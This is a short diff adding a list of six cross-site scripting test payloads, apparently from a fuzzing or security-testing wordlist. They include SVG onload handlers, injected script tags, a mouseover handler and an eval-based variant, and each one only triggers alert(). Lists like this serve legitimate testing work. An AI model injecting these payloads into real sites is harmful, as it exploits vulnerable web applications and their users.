@@ -1,0 +1,6 @@
+"><svg/onload=alert(1)>
+<img>/><svg/onload=alert(1)>
+"></\/\</script><script>alert(1)</script>
+"><script>alert("xss");</script>
+<div onmouseover="alert('XSS');">Hello :) 
+</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
